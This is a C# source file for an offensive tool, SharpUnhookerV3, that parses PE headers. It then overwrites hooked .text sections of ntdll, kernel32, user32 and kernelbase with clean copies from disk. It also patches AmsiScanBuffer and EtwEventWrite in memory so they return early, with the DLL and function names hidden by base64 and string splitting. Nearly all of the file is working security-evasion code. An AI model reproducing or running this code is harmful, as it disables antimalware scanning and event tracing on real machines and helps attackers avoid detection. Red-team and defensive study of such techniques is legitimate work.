using System;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Collections;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.IO;

public class PEReader
{
    public struct IMAGE_DOS_HEADER
    {      // DOS .EXE header
        public UInt16 e_magic;              // Magic number
        public UInt16 e_cblp;               // Bytes on last page of file
        public UInt16 e_cp;                 // Pages in file
        public UInt16 e_crlc;               // Relocations
        public UInt16 e_cparhdr;            // Size of header in paragraphs
        public UInt16 e_minalloc;           // Minimum extra paragraphs needed
        public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
        public UInt16 e_ss;                 // Initial (relative) SS value
        public UInt16 e_sp;                 // Initial SP value
        public UInt16 e_csum;               // Checksum
        public UInt16 e_ip;                 // Initial IP value
        public UInt16 e_cs;                 // Initial (relative) CS value
        public UInt16 e_lfarlc;             // File address of relocation table
        public UInt16 e_ovno;               // Overlay number
        public UInt16 e_res_0;              // Reserved words
        public UInt16 e_res_1;              // Reserved words
        public UInt16 e_res_2;              // Reserved words
        public UInt16 e_res_3;              // Reserved words
        public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
        public UInt16 e_oeminfo;            // OEM information; e_oemid specific
        public UInt16 e_res2_0;             // Reserved words
        public UInt16 e_res2_1;             // Reserved words
        public UInt16 e_res2_2;             // Reserved words
        public UInt16 e_res2_3;             // Reserved words
        public UInt16 e_res2_4;             // Reserved words
        public UInt16 e_res2_5;             // Reserved words
        public UInt16 e_res2_6;             // Reserved words
        public UInt16 e_res2_7;             // Reserved words
        public UInt16 e_res2_8;             // Reserved words
        public UInt16 e_res2_9;             // Reserved words
        public UInt32 e_lfanew;             // File address of new exe header
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY
    {
        public UInt32 VirtualAddress;
        public UInt32 Size;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER32
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt32 BaseOfData;
        public UInt32 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt32 SizeOfStackReserve;
        public UInt32 SizeOfStackCommit;
        public UInt32 SizeOfHeapReserve;
        public UInt32 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER64
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt64 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt64 SizeOfStackReserve;
        public UInt64 SizeOfStackCommit;
        public UInt64 SizeOfHeapReserve;
        public UInt64 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_FILE_HEADER
    {
        public UInt16 Machine;
        public UInt16 NumberOfSections;
        public UInt32 TimeDateStamp;
        public UInt32 PointerToSymbolTable;
        public UInt32 NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader;
        public UInt16 Characteristics;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_SECTION_HEADER
    {
        [FieldOffset(0)]
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] Name;
        [FieldOffset(8)]
        public UInt32 VirtualSize;
        [FieldOffset(12)]
        public UInt32 VirtualAddress;
        [FieldOffset(16)]
        public UInt32 SizeOfRawData;
        [FieldOffset(20)]
        public UInt32 PointerToRawData;
        [FieldOffset(24)]
        public UInt32 PointerToRelocations;
        [FieldOffset(28)]
        public UInt32 PointerToLinenumbers;
        [FieldOffset(32)]
        public UInt16 NumberOfRelocations;
        [FieldOffset(34)]
        public UInt16 NumberOfLinenumbers;
        [FieldOffset(36)]
        public DataSectionFlags Characteristics;

        public string Section
        {
            get { 
                int i = Name.Length - 1;
                while (Name[i] == 0) {
                    --i;
                }
                char[] NameCleaned = new char[i+1];
                Array.Copy(Name, NameCleaned, i+1);
                return new string(NameCleaned); 
            }
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_BASE_RELOCATION
    {
        public uint VirtualAdress;
        public uint SizeOfBlock;
    }

    [Flags]
    public enum DataSectionFlags : uint
    {

        Stub = 0x00000000,

    }


    /// The DOS header

    private IMAGE_DOS_HEADER dosHeader;

    /// The file header

    private IMAGE_FILE_HEADER fileHeader;

    /// Optional 32 bit file header 

    private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

    /// Optional 64 bit file header 

    private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

    /// Image Section headers. Number of sections is in the file header.

    private IMAGE_SECTION_HEADER[] imageSectionHeaders;

    private byte[] rawbytes;



    public PEReader(string filePath)
    {
        // Read in the DLL or EXE and get the timestamp
        using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (this.Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }



            rawbytes = System.IO.File.ReadAllBytes(filePath);

        }
    }

    public PEReader(byte[] fileBytes)
    {
        // Read in the DLL or EXE and get the timestamp
        using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (this.Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }


            rawbytes = fileBytes;

        }
    }


    public static T FromBinaryReader<T>(BinaryReader reader)
    {
        // Read in a byte array
        byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

        // Pin the managed memory while, copy it out the data, then unpin it
        GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
        T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
        handle.Free();

        return theStructure;
    }



    public bool Is32BitHeader
    {
        get
        {
            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
            return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
        }
    }


    public IMAGE_FILE_HEADER FileHeader
    {
        get
        {
            return fileHeader;
        }
    }


    /// Gets the optional header

    public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
    {
        get
        {
            return optionalHeader32;
        }
    }


    /// Gets the optional header

    public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
    {
        get
        {
            return optionalHeader64;
        }
    }

    public IMAGE_SECTION_HEADER[] ImageSectionHeaders
    {
        get
        {
            return imageSectionHeaders;
        }
    }

    public byte[] RawBytes
    {
        get
        {
            return rawbytes;
        }

    }

}

public class PatchAMSIAndETW {
    // Import required APIs
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, ExactSpelling=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
	static byte[] x64_etw_patch = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
	static byte[] x86_etw_patch = new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 };
	static byte[] x64_amsi_patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
	static byte[] x86_amsi_patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

	private static string decode(string b64encoded) {
		return System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(b64encoded));
	}

	private static void PatchMem(byte[] patch, string library, string function) {
		try {
			uint oldProtect;
			IntPtr libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => library.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
			IntPtr funcPtr = GetProcAddress(libPtr, function);
			VirtualProtect(funcPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);
			Marshal.Copy(patch, 0, funcPtr, patch.Length);
		}catch (Exception e) {
			Console.WriteLine(" [!] {0}", e.Message);
			Console.WriteLine(" [!] {0}", e.InnerException);
		}
	}

	private static void PatchAMSI(byte[] patch) {
		string dll = decode("YW1zaS5kbGw=");
		PatchMem(patch, dll, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
	}

	private static void PatchETW(byte[] Patch) {
		PatchMem(Patch, ("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l"), ("Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e"));
	}

	public static void Main() {
		bool isit64bit;
		if (IntPtr.Size == 4) {
			isit64bit = false;
		}else {
			isit64bit = true;
		}
		if (isit64bit) {
			PatchAMSI(x64_amsi_patch);
			Console.WriteLine(decode("WysrK10gIUFNU0kgUEFUQ0hFRCEgWysrK10="));
			PatchETW(x64_etw_patch);
			Console.WriteLine(decode("WysrK10gIUVUVyBQQVRDSEVEISBbKysrXQ=="));
		}else {
			PatchAMSI(x86_amsi_patch);
			Console.WriteLine(decode("WysrK10gIUFNU0kgUEFUQ0hFRCEgWysrK10="));
			PatchETW(x86_etw_patch);
			Console.WriteLine(decode("WysrK10gIUVUVyBQQVRDSEVEISBbKysrXQ=="));
		}
	}
}

public class SharpUnhooker {
	// Import required Windows APIs
	public static uint MEM_COMMIT = 0x1000;
    public static uint PAGE_EXECUTE_READWRITE = 0x40;
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
	[DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Unhooker(string DLLname) {
    	Console.WriteLine("Unhooking Sequence For {0} Started!", DLLname);
    	// get original .text section from original DLL
    	string DLLFullPath;
    	try {
    		// not only get the full path of the DLL,this can prove wether the DLL is loaded or not
			DLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName);
    	}catch {
    		throw new InvalidOperationException("DLL is not loaded!");
    	}
    	byte[] DLLBytes = System.IO.File.ReadAllBytes(DLLFullPath);
        PEReader OriginalDLL = new PEReader(DLLBytes);
		Console.WriteLine("Reading Original DLL...");
        // just to be safe,i allocate as big as the DLL :')
        IntPtr codebase;
		if (OriginalDLL.Is32BitHeader) {
	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader32.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        }else {
	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        }
        for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++) {
            if (OriginalDLL.ImageSectionHeaders[i].Section == ".text") {
            	// read and copy .text section
                IntPtr byteLocationOnMemory = VirtualAlloc(IntPtr.Add(codebase, (int)OriginalDLL.ImageSectionHeaders[i].VirtualAddress), OriginalDLL.ImageSectionHeaders[i].SizeOfRawData, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(OriginalDLL.RawBytes, (int)OriginalDLL.ImageSectionHeaders[i].PointerToRawData, byteLocationOnMemory, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
                byte[] assemblyBytes = new byte[OriginalDLL.ImageSectionHeaders[i].SizeOfRawData];
                Marshal.Copy(byteLocationOnMemory, assemblyBytes, 0, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
                int TextSectionNumber = i;
                if (assemblyBytes != null && assemblyBytes.Length > 0) {
					Console.WriteLine("Yay!Original DLL Readed.");
					Console.WriteLine("Getting in-memory module handle...");
					// use C#'s managed API instead of GetModuleHandle API
					IntPtr ModuleHandleInMemory = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
					if (ModuleHandleInMemory != IntPtr.Zero) {
						Console.WriteLine("Yay!Got module handle : {0}", ModuleHandleInMemory.ToString("X4"));
						Console.WriteLine("Calculating .text section pointer in loaded DLL...");
						IntPtr InMemorySectionPointer = ModuleHandleInMemory + (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].VirtualAddress;
						Console.WriteLine("Calculation done! .text pointer in loaded DLL : {0}", InMemorySectionPointer.ToString("X4"));
						Console.WriteLine("Updating memory protection setting...");
						uint oldProtect;
		    			bool updateProtection = VirtualProtect(InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, 0x40, out oldProtect);
		    			if (updateProtection) {
		    				Console.WriteLine("Yay!Memory protection setting updated!");
		    				Console.WriteLine("Applying patch...");
                            Marshal.Copy(assemblyBytes, 0, InMemorySectionPointer, assemblyBytes.Length);
							Console.WriteLine("Yay!Patch applied!");
							Console.WriteLine("Rechecking Loaded API After Patching...");
							byte[] assemblyBytesAfterPatched = new byte[OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData];
							IntPtr readPatchedAPI = InMemorySectionPointer;
							Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData);
							bool checkAssemblyBytesAfterPatched = assemblyBytesAfterPatched.SequenceEqual(assemblyBytes);
							uint newProtect;
							VirtualProtect(InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, oldProtect, out newProtect);
							if (!checkAssemblyBytesAfterPatched) {
								Console.WriteLine("[-] Patched API Bytes Doesnt Match With Desired API Bytes! API Is Probably Still Hooked! [-]");
							}else {
								Console.WriteLine("[+++] Chill Out,Everything Is Fine.Which Means API Is Unhooked! [+++]");
							}
		    			}else {
							Console.WriteLine("[-] Failed to update memory protection setting! [-]");
						}
					}else {
						Console.WriteLine("[-] Failed to get handle of in-memory module! [-]");
					}
	    		}else {
	    			Console.WriteLine("[-] Reading original DLL from disk failed! [-]");
	    		}
            }
    	}
    }

    public static void SilentUnhooker(string DLLname) {
    	Console.WriteLine("Unhooking Sequence For {0} Started!", DLLname);
    	// get original .text section from original DLL
    	string DLLFullPath;
		try {
    		// not only get the full path of the DLL,this can prove wether the DLL is loaded or not
			DLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName);
    	}catch {
    		throw new InvalidOperationException("DLL is not loaded!");
    	}
    	byte[] DLLBytes = System.IO.File.ReadAllBytes(DLLFullPath);
        PEReader OriginalDLL = new PEReader(DLLBytes);
        // just to be safe,i allocate as big as the DLL :')
        IntPtr codebase;
		if (OriginalDLL.Is32BitHeader) {
            codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader32.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        }else {
            codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        }
        for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++) {
            if (OriginalDLL.ImageSectionHeaders[i].Section == ".text") {
            	// read and copy .text section
                IntPtr byteLocationOnMemory = VirtualAlloc(IntPtr.Add(codebase, (int)OriginalDLL.ImageSectionHeaders[i].VirtualAddress), OriginalDLL.ImageSectionHeaders[i].SizeOfRawData, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(OriginalDLL.RawBytes, (int)OriginalDLL.ImageSectionHeaders[i].PointerToRawData, byteLocationOnMemory, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
                byte[] assemblyBytes = new byte[OriginalDLL.ImageSectionHeaders[i].SizeOfRawData];
                Marshal.Copy(byteLocationOnMemory, assemblyBytes, 0, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
                int TextSectionNumber = i;
                if (assemblyBytes != null && assemblyBytes.Length > 0) {
					IntPtr ModuleHandleInMemory = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
					if (ModuleHandleInMemory != IntPtr.Zero) {
						IntPtr InMemorySectionPointer = ModuleHandleInMemory + (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].VirtualAddress;					uint oldProtect;
		    			bool updateProtection = VirtualProtect(InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, 0x40, out oldProtect);
		    			if (updateProtection) {
                            Marshal.Copy(assemblyBytes, 0, InMemorySectionPointer, assemblyBytes.Length);
							byte[] assemblyBytesAfterPatched = new byte[OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData];
							IntPtr readPatchedAPI = InMemorySectionPointer;
							Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData);
							bool checkAssemblyBytesAfterPatched = assemblyBytesAfterPatched.SequenceEqual(assemblyBytes);
							uint newProtect;
							VirtualProtect(InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, oldProtect, out newProtect);
							if (!checkAssemblyBytesAfterPatched) {
								Console.WriteLine("[-] Patched API Bytes Doesnt Match With Desired API Bytes! API Is Probably Still Hooked! [-]");
							}else {
								Console.WriteLine("[+++] API IS UNHOOKED! [+++]");
							}
		    			}else {
							Console.WriteLine("[-] Failed to update memory protection setting! [-]");
						}
					}else {
						Console.WriteLine("[-] Failed to get handle of in-memory module! [-]");
					}
	    		}else {
	    			Console.WriteLine("[-] Reading original DLL from disk failed! [-]");
	    		}
            }
    	}
    }

    public static void Main() {
		Console.WriteLine("[--------------------------------------]");
    	Console.WriteLine("SharpUnhookerV3 - C# Based API Unhooker.");
    	Console.WriteLine("        Written By GetRektBoy724        ");
    	Console.WriteLine("[--------------------------------------]");
    	Console.WriteLine("[++++++++++!SEQUENCE=STARTED!++++++++++]");
    	Console.WriteLine("--------PHASE 1 == API UNHOOKING--------");
    	// just to be safe,pls dont add more on here
    	SilentUnhooker("ntdll.dll");
    	SilentUnhooker("kernel32.dll");
    	SilentUnhooker("user32.dll");
    	SilentUnhooker("kernelbase.dll");
    	Console.WriteLine("----PHASE 2 == PATCHING AMSI AND ETW----");
    	PatchAMSIAndETW.Main();
    	Console.WriteLine("[+++++++++!SEQUENCE==FINISHED!+++++++++]");
    }
}
